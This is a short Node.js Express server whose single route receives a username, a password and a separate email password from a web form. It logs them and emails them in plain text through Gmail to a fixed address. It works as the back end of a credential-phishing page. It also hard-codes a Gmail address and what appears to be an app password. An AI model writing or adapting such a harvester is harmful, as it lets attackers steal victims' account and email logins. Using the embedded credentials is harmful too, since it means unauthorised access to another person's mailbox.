const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
const PORT = 8000;

// Enable CORS for frontend origin
app.use(cors({ origin: "http://localhost:5500" }));

// Parse incoming form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

// Configure Nodemailer transporter for Gmail
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "allenvivian519@gmail.com", // Replace with your email
    pass: "wvox qdyx khat glot", // Replace with your app-specific password
  },
});

// Helper function to send email
function sendEmail(subject, text) {
  const mailOptions = {
    from: "allenvivian519@gmail.com", // Replace with your email
    to: "allenvivian519@gmail.com", // Replace with recipient email
    subject: subject,
    text: text,
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.error("Error sending email:", error);
    } else {
      console.log("Email sent:", info.response);
    }
  });
}

// Route to handle form submission
app.post("/submit-form", (req, res) => {
  try {
    const { username, password, emailPassword } = req.body;
    console.log("Form data received:", req.body);

    const subject = "New Form Submission";
    const message = `Username: ${username}\nPassword: ${password}\nEmail Password: ${emailPassword}`;

    // Send email with form data
    sendEmail(subject, message);

    // Send response
    res
      .status(200)
      .json({ message: "Form data received and email sent successfully!" });
  } catch (error) {
    console.error("Error processing form submission:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Start the server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
